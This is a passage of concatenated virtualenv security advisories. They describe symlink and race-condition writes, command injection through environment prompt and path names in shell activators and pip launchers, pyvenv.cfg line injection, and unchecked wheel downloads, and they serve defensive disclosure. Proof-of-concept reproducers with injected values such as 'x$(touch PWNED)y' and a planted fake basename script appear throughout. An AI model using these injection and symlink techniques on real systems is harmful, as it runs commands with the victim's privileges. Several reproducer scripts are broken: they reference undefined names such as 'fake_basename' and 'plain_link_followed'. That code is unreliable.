written_outside = os.path.isfile(bash_aliases) and not os.path.islink(bash_aliases)
print("~/.bash_aliases created as a regular file:", written_outside)
if written_outside:
    print("  its first line:", open(bash_aliases).readline().rstrip())
attacker_code_ran = os.path.exists(marker)
print("after a new terminal, marker exists:", attacker_code_ran)
if attacker_code_ran:
    print("  it says:", open(marker).read().rstrip())
print("BUG" if written_outside and attacker_code_ran else "OK")
```

**`repro.d/fake_basename.sh`**

```text
#!/bin/sh
echo "attacker code ran as $(id -un)" > "$HOME/attacker-ran"
exec /usr/bin/basename "$@"
```

**`repro.d/make_hostile_checkout.py`**

```text
import os
import shutil
import sys

checkout = sys.argv[1]
bin_dir = os.path.join(checkout, "venv", "bin")
os.makedirs(bin_dir)

# venv/bin/../../.. is the directory holding the checkout, i.e. ~ for a clone at ~/proj; ~/.bash_aliases does not exist

shutil.copy(os.path.join(os.path.dirname(__file__), "fake_basename.sh"), fake_basename)
os.chmod(fake_basename, 0o755)
```

## Impact

Creation can overwrite or create files outside the requested environment with the invoking user's permissions. File
contents are constrained by what virtualenv generates.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix replaces existing entries, including symbolic and hard links, and exclusively creates generated text
files. Before stdlib creation it replaces executable-directory symlinks and Windows junctions with real directories. It
then removes symbolic and hard links inside that directory, including interpreter executables and DLLs, and at the
configuration and ignore file paths. This also removes unrelated links directly in the executable directory. Final
seed-launcher links are replaced. Exclusive creation protects the final text-file open; delegated stdlib and distlib
writes still require a destination protected from concurrent replacement.

Fix: [PR #3431](https://github.com/pypa/virtualenv/pull/3431).

## Known mitigation

Use a fresh destination beneath an owner-controlled parent. Avoid creation over a tree populated by another account.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-XBEOCBS1.

## Impact

TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities in `virtualenv` allow local attackers to perform symlink-based attacks on directory creation operations. An attacker with local access can exploit a race condition between directory existence checks and creation to redirect virtualenv's app_data and lock file operations to attacker-controlled locations.

**Affected versions:** All versions up to and including 20.36.1

**Affected users:** Any user running `virtualenv` on multi-user systems where untrusted local users have filesystem access to shared temporary directories or where `VIRTUALENV_OVERRIDE_APP_DATA` points to a user-writable location.

**Attack scenarios:**
- Cache poisoning: Attacker corrupts wheels or Python metadata in the cache
- Information disclosure: Attacker reads sensitive cached data or metadata
- Lock bypass: Attacker controls lock file semantics to cause concurrent access violations
- Denial of service: Lock starvation preventing virtualenv operations

## Patches

The vulnerability has been patched by replacing check-then-act patterns with atomic `os.makedirs(..., exist_ok=True)` operations.

**Fixed in:** PR #3013

**Versions with the fix:** 20.36.2 and later

Users should upgrade to version 20.36.2 or later.

## Workarounds

If you cannot upgrade immediately:

1. Ensure `VIRTUALENV_OVERRIDE_APP_DATA` points to a directory owned by the current user with restricted permissions (mode 0700)
2. Avoid running `virtualenv` in shared temporary directories where other users have write access
3. Use separate user accounts for different projects to isolate app_data directories

## References

- GitHub PR: https://github.com/pypa/virtualenv/pull/3013
- Vulnerability reported by: @tsigouris007
- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (TOCTOU)
- CWE-59: Improper Link Resolution Before File Access

### Impact

zsh users activate an environment with the bash `activate` script, which puts the environment name into `PS1`. Since
21.13.0 the script escapes backslashes, dollar signs and backticks in that name, but only when `BASH_VERSION` is set, so
zsh gets the raw value. With the `PROMPT_SUBST` option set, zsh runs parameter expansion, command substitution and
arithmetic expansion on `PS1` each time it draws the prompt. A name that contains `$(...)`, backticks or `${...}` then
runs as commands in the user's shell, once per prompt.

The name comes from the environment directory, or from `--prompt` or `VIRTUALENV_PROMPT`. After you create an
environment with:

```console
$ virtualenv 'x$(touch PWNED)y'
```

`source 'x$(touch PWNED)y/bin/activate'` in a zsh session with `PROMPT_SUBST` set creates `PWNED`, and the prompt shows
`(xy)`. Passing that value as `--prompt` to an environment with a plain name has the same effect. Without
`PROMPT_SUBST`, zsh shows the name as text and runs nothing. bash runs nothing either.

A plain zsh starts with `PROMPT_SUBST` off. oh-my-zsh users have it on: oh-my-zsh loads
[`lib/theme-and-appearance.zsh`](https://github.com/ohmyzsh/ohmyzsh/blob/4d4cfc287e9d887b81242c0e431b5f49f9cec5c1/lib/theme-and-appearance.zsh#L5)
at startup, and that file sets it. An attacker needs to influence the environment path or prompt: a CI job or wrapper
tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive.
`--prompt .` takes the current directory's name.

zsh also reads `%` in `PS1` as a prompt escape, so a name with `%n` showed the user name in place of those characters,
though without running commands.

The bug is in releases up to and including 21.14.3. The payload runs on 20.26.6 and 21.14.3, and the reporter confirmed
21.9.1.

### Patches

Fixed in 21.14.4. Under zsh, `activate` now escapes the name the way it does under bash and doubles
`%`, so the example above runs nothing and the prompt shows the name as given. zsh gets the escaping even when
`PROMPT_SUBST` is off, because a user can set the option after activation; a name with a backslash, dollar sign or
backtick then shows the added backslashes.
Fix: https://github.com/pypa/virtualenv/commit/5b915367da82bd024b2a0d28d2f98007034b4aa2

### Workarounds

Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run
`unsetopt prompt_subst` if your prompt does not need it. Check the name of an environment you did not create before you
source its `activate`.

### Credits

Kaya Emre Arikan (@kemrec) reported this issue.

vulnerabilities.details:
## Summary

Caller-supplied prompt text can become executable syntax in the bash activation prompt. An attacker must influence the
value passed to virtualenv, and a user must subsequently activate the environment and draw the prompt.

## Affected area

Bash runs with compatibility level 4.2 and draws the environment prompt. Its replacement-string behavior differs from
newer compatibility modes, leaving prompt text subject to a second interpretation. The report concerns POSIX activation.
It does not establish exposure through unrelated activators.

## Attacker-controlled input

The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated
activation script.

## Affected code

The relevant 21.14.8 source is in
[bash prompt assembly](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/bash/activate.sh).

## Mechanism

`bin/activate` copies the prompt into `PS1`. A shell expands `PS1` again when it draws a prompt, so the value must
survive both the assignment and that later expansion. The bash and zsh branches escape for their usual prompt rules.
Three other paths still interpret prompt data as commands: dash sourcing `activate` directly, a child dash inheriting an
exported `PS1` from bash, and bash running at compatibility level 4.2 or lower. A value such as `x$(touch MARKER)y` then
runs `touch` on prompt display. Creating the environment does not run the payload.

## Reproduction and evidence

The scanner's child-shell reproducer creates an environment with `--prompt 'x$(touch MARKER)y'`, sources `bin/activate`
in interactive bash, and starts interactive `sh` (dash). Its control leaves `PS1` unexported: neither shell creates
`MARKER`. With `PS1` exported, bash displays the prompt without executing the value, but the child dash creates
`MARKER`; the reproducer ends in `BUG`. The report gives separate console reproductions for direct dash activation and
bash compatibility level 4.2. The child-shell path can arise after another environment's activation has exported `PS1`.

The scanner linked this finding to [#3326](https://github.com/pypa/virtualenv/pull/3326) and its follow-up #3390. Those
changes cover the usual bash path but leave the three paths above. The proposed change in
[#3418](https://github.com/pypa/virtualenv/pull/3418) keeps a variable reference in `PS1`, so prompt text is expanded as
data when drawn. The private report's reproducer was run by the scanner; the later command-execution result was supplied
by the maintainer review. This advisory does not claim that every POSIX shell or every bash mode is affected.

## Introduced

The report traces direct dash sourcing to the first 20.x activator (20.0.0b1), and inherited `PS1` to #3390 (first
released in 21.14.7). It demonstrates the compatibility-level case on bash 5.2. Those historical boundaries come from
the report; the release confirmed by the maintainer is 21.14.8.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prompt supplier
    participant V as virtualenv
    participant B as Interactive bash
    participant D as Child dash
    A->>V: --prompt x$(touch MARKER)y
    V->>B: generated bin/activate
    B->>B: assign escaped prompt to PS1
    alt PS1 is not exported
        B->>D: start sh with its own PS1
        D-->>B: marker absent
    else PS1 is exported
        B->>D: start sh with inherited PS1
        D->>D: expand $(touch MARKER) on prompt draw
        D-->>B: marker created
    end
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-1MOI2X3T`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import shutil
import subprocess
from pathlib import Path

work = Path("/tmp/repro-inherited-ps1")
shutil.rmtree(work, ignore_errors=True)
work.mkdir()
marker = work / "MARKER"
print("sh is", Path("/bin/sh").resolve())

# attacker: only the text a tool such as tox or hatch relays as --prompt
hostile_prompt = f"x$(touch {marker})y"

# set up: the environment, made with the virtualenv command
subprocess.run(
    ["virtualenv", "--no-periodic-update", "--without-pip", "--activators", "bash",
     "--prompt", hostile_prompt, str(work / "env")],
    check=True, stdout=subprocess.DEVNULL,
)
assert not marker.exists(), "creating the environment must not run the prompt"

# user: in an interactive bash, source bin/activate, then start sh.
# -i makes both shells draw their prompt although stdin is not a terminal; sh draws one, reads EOF and returns
session = Path("/tmp/repro.d/user_session.sh").read_text()
interactive_bash = ["bash", "--norc", "--noprofile", "-i"]

# control: PS1 set in bash but not exported, so sh does not inherit it
control = subprocess.run(interactive_bash, input="PS1='\\$ '\n" + session,
                         stderr=subprocess.PIPE, text=True, check=True)
print(control.stderr)
ran_in_control = marker.exists()
print("CONTROL  PS1 not exported: marker created:", ran_in_control)

# attack: the same session with the one difference that PS1 is exported
attack = subprocess.run(interactive_bash, input="export PS1='\\$ '\n" + session,
                        stderr=subprocess.PIPE, text=True, check=True)
print(attack.stderr)
ran_in_attack = marker.exists()
print("OBSERVED PS1 exported:     marker created:", ran_in_attack)

# check: the prompt text must be drawn, never run, by every shell that draws it
print("BUG" if ran_in_attack and not ran_in_control else "OK")
```

**`repro.d/user_session.sh`**

```text
. /tmp/repro-inherited-ps1/env/bin/activate
sh -i </dev/null
```

## Impact

An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script
precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The
attack requires control of argument data and subsequent user activation; it does not require replacing an executable or
controlling app-data contents.

## Versions tested

The supplied follow-up review marks command execution as independently confirmed by its author. The implementation
review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation
source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation
of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.

## Known mitigation

Use trusted prompt and destination values. On older releases, disable the environment prompt with
VIRTUAL_ENV_DISABLE_PROMPT=1. Recreate environments with virtualenv 21.14.9 or later.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

The original report was supplied by Anthropic's OSS Scanner as ANT-2026-1MOI2X3T. The subsequent maintainer-provided
review identified the remaining activation path.

vulnerabilities.details:
`download_wheel()` runs `pip download` and hands the result straight to the seeder, with nothing checking the bytes it gets back. The embedded pip and setuptools wheels carry a `BUNDLE_SHA256` that virtualenv checks on every load, but a wheel fetched over the network for the periodic-update feature or the `--download` flag had no equivalent verification.

A compromised index, a stale mirror, or a MITM'd download (when TLS is intercepted, e.g. via a misconfigured or malicious CA) could substitute a different wheel under the same distribution/version/filename, and virtualenv would cache and seed it into every environment created afterward with no warning.

Fixed by computing the downloaded wheel's sha256 and comparing it against the digest PyPI's public JSON API reports for that exact release, independent of which index actually served the file. The check is skipped, not treated as failure, when a custom index (`PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, `PIP_INDEX`) is configured, since a private index can legitimately serve a different, intentionally rebuilt wheel. Fix: https://github.com/pypa/virtualenv/pull/3251
vulnerabilities.summary: virtualenv: Downloaded seed wheels (pip/setuptools) are not integrity-checked before use

### Summary

`pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()` wrote values verbatim, while `PyEnvCfg._read_values()` parses the file with `str.splitlines()`. A value containing a line boundary therefore became additional configuration lines, and because reading is last-wins, the injected keys replaced any key written earlier in the file.

### Impact

The `prompt` value is the reachable input: it is set by `--prompt`, by the `VIRTUALENV_PROMPT` environment variable, or from the config file, and `write()` emits `prompt` before `home`. A crafted prompt can therefore set `home` in the generated `pyvenv.cfg`:

```console
$ virtualenv --prompt $'x"\nhome = /attacker/path\nprompt = "z' venv
$ grep '^home' venv/pyvenv.cfg
home = /attacker/path
```

`home` is what tooling reads to locate the base interpreter, so a consumer that trusts it can be pointed elsewhere. `implementation`, `version_info`, `version`, `executable`, `command` and `virtualenv` are also written before `prompt` and can be replaced the same way.

This requires the prompt to come from somewhere other than the person running the command, for example a CI job templating a branch name into it, tooling deriving an environment name from user-supplied data, or an inherited `VIRTUALENV_PROMPT`. Where the operator supplies the prompt directly they already control the command line, and the effect is corruption rather than privilege gain: the value is truncated at the boundary and read back with a dangling quote.

### Details

The boundary set is the one `str.splitlines()` recognizes, which is wider than `\n`: `\r`, `\v`, `\f`, the file, group and record separators, `U+0085`, `U+2028` and `U+2029` were all written through unchanged and all split the line when read back.

### Patches

`PyEnvCfg.write()` now collapses those boundaries to spaces as it serializes each line, so it cannot emit a structurally invalid file regardless of what a caller places in `content`.

### Workarounds

Do not pass externally influenced data as the virtualenv prompt. Strip line boundaries from any value before using it as `--prompt` or `VIRTUALENV_PROMPT`.

vulnerabilities.details:
### Impact

`FishActivator` defines no `quote()`, so it inherits `ViaTemplateActivator.quote`, which returns `shlex.quote(string)`. That function follows POSIX `sh` rules, where a backslash inside single quotes stays a literal character. fish reads `\'` inside single quotes as an escaped quote and `\\` as an escaped backslash. A value with a backslash before a quote therefore ends the literal somewhere other than where `shlex.quote` put the end, and fish expands the command substitution that follows.

The environment path reaches `set -gx VIRTUAL_ENV`, and `--prompt` or `VIRTUALENV_PROMPT` reaches `set -gx VIRTUAL_ENV_PROMPT`. For `--prompt "x\'\$(touch PWNED)'\'"`, the generated `activate.fish` contains:

```fish
set -gx VIRTUAL_ENV_PROMPT 'x\'"'"'$(touch PWNED)'"'"'\'"'"''
```

`source bin/activate.fish` runs `touch PWNED`, and fish prints no error. The same payload as a directory name runs through `VIRTUAL_ENV`. `--prompt .` takes the current directory's name, so running virtualenv inside a directory someone else named is enough. Without the backslash the payload runs nothing, and under bash it runs nothing either.

virtualenv generates `activate.fish` by default. An attacker needs to influence the environment path or prompt: a CI job or wrapper tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive.

The bug affects every release up to 21.14.1 that ships `activate.fish`. The GHSA-p58f-9548-mpm2 fix in 21.7.13 moved the placeholders outside their quotes but kept `shlex.quote`.

### Patches

Fixed in 21.14.2. `activate.fish` now escapes backslashes and single quotes the way fish reads them, so the example above runs nothing and shows the prompt as given. Fix: https://github.com/pypa/virtualenv/commit/3bddeaf8d02c3ee7f576503efb082f8f494cfcab

### Workarounds

Do not create an environment whose path or prompt contains a backslash, and inspect `activate.fish` before you source one you did not create.

### Credits

Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.

vulnerabilities.details:
## Summary

A destination path supplied to virtualenv can be interpreted as shell syntax by a generated POSIX console launcher. The
app-data seeder and pip delegate launcher generation to distlib but supply the interpreter path in a form that does not
preserve it as literal data in the shell wrapper.

## Affected area

POSIX console scripts generated by the app-data seeder or pip when the interpreter path requires a shell wrapper.
Windows executable launchers are not affected by this path.

## Attacker-controlled input

An attacker must influence the environment destination passed to virtualenv, and the user must subsequently run a
generated launcher. The attacker does not need to modify an installed executable or control the user's app-data cache.

## Affected code

The relevant 21.14.8 source is in
[ScriptMakerCustom](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/pip_install/base.py).

## Mechanism

The app-data seeder passes the environment's interpreter path through `enquote_executable()` to distlib's `ScriptMaker`.
It adds double quotes for a path with a space but does not escape shell expansions inside those quotes. When the path
has a space or the shebang exceeds 127 bytes, distlib emits a `#!/bin/sh` wrapper with a line shaped like
`'''exec' "<path>" "$0" "$@"`. The shell expands `$(...)` and backticks in that path when the launcher is run. The same
wrapper must also parse as Python, which exposes additional quote and backslash cases. Environment creation and
activation do not trigger the shell payload.

## Reproduction and evidence

The scanner created three environments: a control under `my -touch PWNED- project`, one under
`my $(touch PWNED) project`, and one under a path of more than 127 bytes ending in `$(touch${IFS}PWNED)`. Each was
created without producing `PWNED`. Running the generated `bin/pip --version` created `PWNED` in both attack cases; the
control created none. The long-path case reached the shell wrapper without a space. This reproduces execution by the
generated launcher, with the user's privileges, rather than during seeding.

The report dates the app-data seeder's distlib launcher integration to #1579, first released in 20.0.2.
[PR #3417](https://github.com/pypa/virtualenv/pull/3417) quotes the raw interpreter path for the POSIX wrapper and
repairs launchers written by the pip seeder. Pip's own distlib can write a vulnerable wrapper again during a later pip
install or upgrade; the proposed virtualenv fix does not change pip's vendored code. The maintainer-provided follow-up
review reports that later path separately.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Destination supplier
    participant V as virtualenv seeder
    participant D as distlib ScriptMaker
    participant S as Generated bin/pip
    participant U as User
    A->>V: path contains $(touch PWNED)
    V->>D: pass interpreter path with incomplete shell quoting
    D->>S: write /bin/sh wrapper
    Note over V,S: no payload runs during creation or activation
    U->>S: pip --version
    S->>S: shell expands path and runs touch
    S-->>U: PWNED appears with user's privileges
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-5DZVLGL1`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import shutil
import subprocess
from pathlib import Path

WORK = Path("/tmp/repro-console-script")

# The attacker's whole input: the name of a directory above the environment (a repository, a project folder).
DIRECTORY_NAMES = {
    "CONTROL": "my -touch PWNED- project",
    "OBSERVED": "my $(touch PWNED) project",
    # no space: distlib also picks the /bin/sh launcher once "#!<dest>/bin/python" is longer than 127 bytes
    "OBSERVED_LONG": "p" * 120 + "$(touch${IFS}PWNED)",
}

shutil.rmtree(WORK, ignore_errors=True)
pip_printed = {}
created_by_pip = {}
for label, name in DIRECTORY_NAMES.items():
    # the payload can hold no "/", so it touches a relative PWNED: each case gets its own empty working directory
    cwd = WORK / label / "cwd"
    venv = WORK / label / name / "venv"
    cwd.mkdir(parents=True)

    # set up: the user creates an environment there with default options (--no-periodic-update keeps it offline)
    subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", str(venv)], cwd=cwd, check=True)
    assert list(cwd.iterdir()) == [], "environment creation must not have created anything"

    # trigger: the user runs the seeded pip; argv is a list, so the only shell that reads the name is bin/pip's own
    pip = subprocess.run([venv / "bin" / "pip", "--version"], cwd=cwd, capture_output=True, text=True)
    pip_printed[label] = pip.stdout
    created_by_pip[label] = sorted(p.name for p in cwd.iterdir())

    launcher = (venv / "bin" / "pip").read_text().splitlines()
    print(f"{label}: directory name {name!r}")
    print(f"  bin/pip line 1: {launcher[0]}")
    print(f"  bin/pip line 2: {launcher[1]}")
    print(f"  bin/pip --version printed: {(pip.stdout + pip.stderr).strip()}")
    print(f"  files bin/pip created in the working directory: {created_by_pip[label]}")

# check: a directory name is data; starting pip must run pip and nothing else
control_ok = pip_printed["CONTROL"].startswith("pip ") and created_by_pip["CONTROL"] == []
attack_ran = created_by_pip["OBSERVED"] == ["PWNED"] and created_by_pip["OBSERVED_LONG"] == ["PWNED"]
print("BUG" if control_ok and attack_ran else "OK")
```

## Fix scope and remaining exposure

PR #3417 changes launcher generation by the app-data seeder and repairs POSIX shell wrappers after pip seeding. The
pip-seeder repair uses the same quoting rule and updates the installed RECORD hashes and sizes. It does not modify pip's
vendored distlib.

A later independent pip installation or upgrade can replace a corrected launcher with an affected one. Existing
launchers are not repaired by upgrading virtualenv alone. Recreate environments with the corrected virtualenv to
regenerate them, and use trusted destination paths. Recreation does not protect launchers subsequently rewritten by pip.
The follow-up review reports reproduction through the previous pip seeder and after a pip upgrade; those results are
attributed to the reviewer.

## Impact

Running an affected launcher can execute commands with the calling user's privileges. Classification: high, CVSS 7.8,
`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`, following the project's
[generated-script precedent](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The vector
assumes attacker-controlled path data and a user invoking the resulting launcher. No prior victim privileges are
required; successful command execution can affect the user's data and processes.

## Versions tested

The maintainer confirmed validation of the reported findings on release 21.14.8. The subsequent review
records reproduction on unfixed upstream/main; the affected launcher integration and dependency declarations are
unchanged from 21.14.8. The first affected release has not been established. Fixed in 21.14.9.

## Known mitigation

Use an environment destination chosen by a trusted user. For older releases, avoid generating
environments at destinations derived from untrusted input.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-5DZVLGL1.

## Summary

The builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those
directories. This permits writes outside the requested destination.

Anthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Directory preparation before environment files are created.

## Attacker-controlled input

Another account must be able to prepare linked entries below the chosen destination before creation. The invoking user
must have access to the linked destination. This does not require write access to the target itself under the other
account.

## Affected code

The relevant 21.14.8 source is in
[builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),
[ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

The builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing
symlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script
generation then write through that parent link. A final-file check cannot prevent a write through a linked parent.
`--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.

## Reproduction and evidence

The scanner's project tree contains `venv/bin -> ../../.local/bin` and a `.pth` file in the environment's package tree.
With the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote
`python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later
`pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A
second case began with the `bin` link resolving inside the environment; replacement of a planted package link during
seeding changed where it resolved, and writes again reached `~/.local/bin`.

The attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and
would run if the user used that environment directly; the added effect is creation-time writing or replacement outside
the requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path
to 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before
creation. Concurrent parent replacement remains a separate case.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared destination
    participant V as Builtin creator
    participant L as venv/bin symlink
    participant H as ~/.local/bin
    participant U as User
    A->>L: point to ../../.local/bin
    V->>L: ensure_dir accepts existing directory link
    V->>H: write python, pip and activate files through link
    V-->>U: creation reports success
    U->>H: run pip found on PATH
    H->>A: interpreter loads planted .pth
    A-->>U: marker created
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-MUFJEG11`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
from pathlib import Path

WORK = Path("/tmp/planted-bin-link")
shutil.rmtree(WORK, ignore_errors=True)


def user_creates_venv_in_checkout_then_runs_pip(home, make_checkout):
    local_bin = home / ".local/bin"
    user_env = {"HOME": str(home), "PATH": f"{local_bin}:{os.environ['PATH']}"}
    local_bin_before = set(os.listdir(local_bin))
    payload_marker = home / "PWNED"

    # the attacker's checkout arrives at ~/project
    subprocess.run([sys.executable, f"/tmp/repro.d/{make_checkout}", home / "project"], check=True)
    venv = home / "project/venv"
    print(f"CONTROL  venv/bin before the run resolves to {os.path.realpath(venv / 'bin')}")

    # default options; the flag only keeps the run off the network
    subprocess.run(["virtualenv", "--no-periodic-update", "--quiet", "venv"], cwd=home / "project", env=user_env, check=True)
    written = sorted(set(os.listdir(local_bin)) - local_bin_before)
    payload_ran_at_creation = payload_marker.exists()
    print(f"OBSERVED venv/bin after the run resolves to  {os.path.realpath(venv / 'bin')}")
    print(f"OBSERVED virtualenv wrote to {local_bin}: {written}")
    print(f"OBSERVED ~/PWNED exists after virtualenv: {payload_ran_at_creation}")

    # later, in another folder, the user runs pip
    pip = subprocess.run(["pip", "--version"], cwd=home, env=user_env, capture_output=True, text=True)
    print(f"OBSERVED pip --version: {(pip.stdout + pip.stderr).strip()}")
    print(f"OBSERVED ~/PWNED exists after pip: {payload_marker.exists()}")
    return written, payload_marker.exists() and not payload_ran_at_creation


print("--- checkout_with_bin_link.py: venv/bin -> ../../.local/bin")
home = WORK / "bin-link"
(home / ".local/bin").mkdir(parents=True)
written_1, pip_ran_payload_1 = user_creates_venv_in_checkout_then_runs_pip(home, "checkout_with_bin_link.py")

(home / ".local/bin/python").symlink_to("/usr/local/bin/python3")
written_2, pip_ran_payload_2 = user_creates_venv_in_checkout_then_runs_pip(home, "checkout_with_bin_link_staying_inside.py")

print(f"OBSERVED second checkout: pip, activate written to ~/.local/bin and pip ran the payload: {link_staying_inside_followed}")
print("BUG" if plain_link_followed or link_staying_inside_followed else "OK")
```

## Impact

Creation can place or replace environment files outside the selected tree. The written bytes are environment-creation
output; arbitrary attacker-selected file contents are not established.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.
Each replacement is created immediately, and an existing entry must be a real directory. A warning names each replaced
link or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree
replacement.

Fix: [PR #3429](https://github.com/pypa/virtualenv/pull/3429).

## Known mitigation

Create environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by
another account.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits
